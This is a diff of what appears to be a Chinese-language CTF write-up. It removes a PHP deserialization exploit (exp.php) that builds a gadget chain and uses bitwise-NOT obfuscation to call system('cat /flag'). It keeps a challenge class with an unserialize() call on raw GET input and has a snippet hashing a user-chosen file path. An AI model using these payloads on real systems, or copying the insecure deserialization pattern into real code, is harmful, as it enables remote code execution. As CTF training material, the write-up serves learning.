@@ -1,10 +1,4 @@
-# Week 1
-# Please wake me up
 
-发送后控制台返回`ezezpop.php`的`base64`
-
-`Ori.php`
-```php
 <?php
 #flag在/flag中
 highlight_file(__FILE__);
@@ -58,59 +52,12 @@ class me{
     public $d;
     public function __invoke(){
         $this->a->oh($this->c);
-        
+
     }
     public function __wakeup(){
         $this->b->ho($this->d);
     }
-    
+
 }
 
-unserialize($_POST['mobile']);
-?> 
-```
-本题使用 [class, method] 存储函数，进而可以调用
-注意用 `HackerBar` 提交的话改为 `application/x-www-form-urlencoded (raw)`
-
-`exp.php`
-```php
-<?php
-class phone
-{
-    public $a;
-    public function test() {}
-}
-
-class please
-{
-    public $a;
-    public function __construct() {
-        $phone = new phone();
-        $phone->a = "\$_=~\"" . ~'system' . "\";" . "\$_(~\"" . ~'cat /flag' . "\");";
-        $this->a = [$phone, 'test']; // $phone->test 赋值给 $this->a
-    }
-}
-
-echo urlencode(serialize(new please()));
-```
-# final
-## 签个到吧
-`Solve.php`
-```php
-<?php
-
-$this->a = &$this->b
-```
-## not_ezphp
-`Ori.php`
-```php
-<?php
-# Try to read flag.php
-
-if (isset($_POST['file'])){
-  echo hash_file('md5', $_POST['file']);
-}
-```
-```Plain
-post file=
-```
+unserialize($_GET['mobile']);
